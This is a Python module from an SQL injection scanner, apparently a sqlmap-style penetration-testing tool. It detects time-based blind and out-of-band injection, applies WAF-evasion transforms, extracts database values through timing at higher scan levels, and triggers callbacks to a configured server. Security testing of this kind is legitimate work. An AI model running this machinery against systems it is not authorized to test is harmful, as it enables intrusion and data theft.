# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
BreachSQL — engine/_scanner/blind.py
Time-based blind and out-of-band (OOB) SQLi detection (async).
"""

from __future__ import annotations

import time
from typing import Any, Dict, List, Optional

from ..log import get_logger
from ..reporter import TimeFinding, OOBFinding, ExtractionFinding, ScanResult
from ..http.injector import AsyncInjector
from ..http.waf_detect import EVASION_NONE
from .options import ScanOptions
from .payloads import apply_evasion, get_time_payloads, get_oob_payloads

logger = get_logger("breachsql.blind")

_MAX_TIME_PAYLOADS = 12


async def run_time_based(
    surface: Dict[str, Any],
    evasions: List[str],
    opts: ScanOptions,
    injector: AsyncInjector,
    result: ScanResult,
) -> None:
    """Test a single surface for time-based blind SQLi (sequential — timing sensitive)."""
    url       = surface["url"]
    method    = surface["method"]
    params    = surface["params"]
    param     = surface["single_param"]
    json_body  = surface.get("json_body", False)
    path_index = surface.get("path_index", 0)

    evasion    = evasions[0] if evasions else EVASION_NONE
    dbms       = result.dbms_detected or opts.dbms
    second_url = getattr(opts, "second_url", "")

    payloads = get_time_payloads(dbms, opts.time_threshold)[:_MAX_TIME_PAYLOADS]

    baseline_time = await _measure_baseline(injector, url, method, params, param, second_url, json_body, path_index)
    if baseline_time is None:
        return

    _prev_count = len(result.time_based)

    for evasion in (evasions if evasions else [EVASION_NONE]):
        for raw_payload in payloads:
            payload = apply_evasion(raw_payload, evasion)
            elapsed = await _async_timed_fetch(injector, url, method, params, param, payload,
                                               second_url=second_url, json_body=json_body, path_index=path_index)
            if elapsed is None:
                continue

            if elapsed >= opts.time_threshold and elapsed >= baseline_time * 2:
                elapsed2 = await _async_timed_fetch(injector, url, method, params, param, payload,
                                                    second_url=second_url, json_body=json_body, path_index=path_index)
                if elapsed2 is not None and elapsed2 >= opts.time_threshold:
                    _dbms = _infer_dbms_from_payload(raw_payload)
                    logger.finding(
                        "Time-based SQLi: %s param=%s delay=%.2fs payload=%s",
                        url, param, elapsed, payload,
                    )
                    result.append_time(TimeFinding(
                        url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        dbms=_dbms,
                        observed_delay=round(elapsed, 2),
                        threshold=opts.time_threshold,
                    ))
                    if result.dbms_detected is None and _dbms != "unknown":
                        result.dbms_detected = _dbms
                    if opts.level >= 3:
                        from .extract import extract_value, get_extraction_targets
                        _baseline_resp = ""
                        _surface = {"url": url, "method": method, "params": params,
                                    "single_param": param,
                                    "json_body": json_body, "path_index": path_index}
                        for _label, _expr in get_extraction_targets(_dbms):
                            _extracted = await extract_value(
                                expr=_expr,
                                surface=_surface,
                                evasions=[evasion],
                                opts=opts,
                                injector=injector,
                                baseline=_baseline_resp,
                                mode="time",
                            )
                            if _extracted:
                                logger.finding("Extracted via time blind: %s param=%s %s=%s",
                                               url, param, _label, _extracted)
                                result.append_extraction(ExtractionFinding(
                                    url=url, parameter=param, method=method,
                                    expr=_expr, value=_extracted, mode="time",
                                ))
                    return

        if len(result.time_based) > _prev_count:
            break


async def run_oob(
    surface: Dict[str, Any],
    evasions: List[str],
    opts: ScanOptions,
    injector: AsyncInjector,
    result: ScanResult,
) -> None:
    """Inject OOB payloads (async). Confirmation requires checking your callback server externally."""
    if not opts.oob_callback:
        return

    url       = surface["url"]
    method    = surface["method"]
    params    = surface["params"]
    param     = surface["single_param"]
    json_body  = surface.get("json_body", False)
    path_index = surface.get("path_index", 0)

    evasion = evasions[0] if evasions else EVASION_NONE
    dbms    = result.dbms_detected or opts.dbms

    payloads = get_oob_payloads(dbms, opts.oob_callback)
    _prev_count = len(result.oob)

    for evasion in (evasions if evasions else [EVASION_NONE]):
        for raw_payload in payloads:
            payload = apply_evasion(raw_payload, evasion)
            try:
                if method.upper() == "POST":
                    if json_body:
                        await injector.post(url, json_body={**params, param: payload})
                    else:
                        await injector.post(url, data={**params, param: payload})
                elif method.upper() == "PATH":
                    await injector.inject_path(url, path_index, payload)
                elif method.upper() == "COOKIE":
                    await injector.inject_cookie(url, param, payload)
                else:
                    await injector.inject_get(url, param, payload)
            except Exception as exc:
                logger.debug("OOB inject error %s param=%s: %s", url, param, exc)
                continue

            logger.finding("OOB payload injected (unconfirmed — check callback server): %s param=%s", url, param)
            result.append_oob(OOBFinding(
                url=url,
                parameter=param,
                method=method,
                payload=payload,
                callback_url=opts.oob_callback,
                confirmed=False,
            ))
            return

        _cur_count = len(result.oob)
        if _cur_count > _prev_count:
            break


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

async def _async_timed_fetch(
    injector: AsyncInjector,
    url: str,
    method: str,
    params: Dict[str, str],
    param: str,
    value: str,
    second_url: str = "",
    json_body: bool = False,
    path_index: int = 0,
) -> Optional[float]:
    """Send request with *value* appended to the original param; return elapsed seconds."""
    import urllib.parse as _up

    if method.upper() == "GET":
        qs = _up.parse_qs(_up.urlparse(url).query, keep_blank_values=True)
        original = qs.get(param, [""])[0]
    else:
        original = params.get(param, "")
    injected_value = original + value
    injected = {**params, param: injected_value}

    t0 = time.monotonic()
    try:
        if second_url:
            if method.upper() == "POST":
                if json_body:
                    await injector.post(url, json_body=injected)
                else:
                    await injector.post(url, data=injected)
            elif method.upper() == "PATH":
                await injector.inject_path(url, path_index, injected_value)
            elif method.upper() == "COOKIE":
                await injector.inject_cookie(url, param, injected_value)
            elif method.upper() == "HEADER":
                await injector.inject_header(url, param, injected_value)
            else:
                await injector.inject_get(url, param, injected_value)
            await injector.get(second_url)
        elif method.upper() == "POST":
            if json_body:
                await injector.post(url, json_body=injected)
            else:
                await injector.post(url, data=injected)
        elif method.upper() == "PATH":
            await injector.inject_path(url, path_index, injected_value)
        elif method.upper() == "COOKIE":
            await injector.inject_cookie(url, param, injected_value)
        elif method.upper() == "HEADER":
            await injector.inject_header(url, param, injected_value)
        else:
            await injector.inject_get(url, param, injected_value)
        return time.monotonic() - t0
    except Exception:
        return None


async def _measure_baseline(
    injector: AsyncInjector,
    url: str,
    method: str,
    params: Dict[str, str],
    param: str,
    second_url: str = "",
    json_body: bool = False,
    path_index: int = 0,
) -> Optional[float]:
    """Return the minimum of two clean request times."""
    times = []
    for _ in range(2):
        t = await _async_timed_fetch_clean(injector, url, method, params, param,
                                           second_url=second_url, json_body=json_body, path_index=path_index)
        if t is not None:
            times.append(t)
    return min(times) if times else None


async def _async_timed_fetch_clean(
    injector: AsyncInjector,
    url: str,
    method: str,
    params: Dict[str, str],
    param: str,
    second_url: str = "",
    json_body: bool = False,
    path_index: int = 0,
) -> Optional[float]:
    """Send the request with the original param value (no injection) and return elapsed seconds."""
    import urllib.parse as _up

    if method.upper() == "GET":
        qs = _up.parse_qs(_up.urlparse(url).query, keep_blank_values=True)
        original = qs.get(param, [""])[0]
    else:
        original = params.get(param, "")

    t0 = time.monotonic()
    try:
        if second_url:
            if method.upper() == "POST":
                if json_body:
                    await injector.post(url, json_body=params)
                else:
                    await injector.post(url, data=params)
            elif method.upper() == "PATH":
                await injector.inject_path(url, path_index, original)
            elif method.upper() == "COOKIE":
                await injector.inject_cookie(url, param, original)
            elif method.upper() == "HEADER":
                await injector.inject_header(url, param, original)
            else:
                await injector.inject_get(url, param, original)
            await injector.get(second_url)
        elif method.upper() == "POST":
            if json_body:
                await injector.post(url, json_body=params)
            else:
                await injector.post(url, data=params)
        elif method.upper() == "PATH":
            await injector.inject_path(url, path_index, original)
        elif method.upper() == "COOKIE":
            await injector.inject_cookie(url, param, original)
        elif method.upper() == "HEADER":
            await injector.inject_header(url, param, original)
        else:
            await injector.inject_get(url, param, original)
        return time.monotonic() - t0
    except Exception:
        return None


# Keep the old name as an alias so stacked.py and extract.py can import it unchanged
_timed_fetch = _async_timed_fetch


def _infer_dbms_from_payload(payload: str) -> str:
    p = payload.lower()
    if "pg_sleep(" in p:        return "postgres"
    if "sleep(" in p:           return "mysql"
    if "waitfor delay" in p:    return "mssql"
    if "randomblob(" in p:      return "sqlite"
    return "unknown"
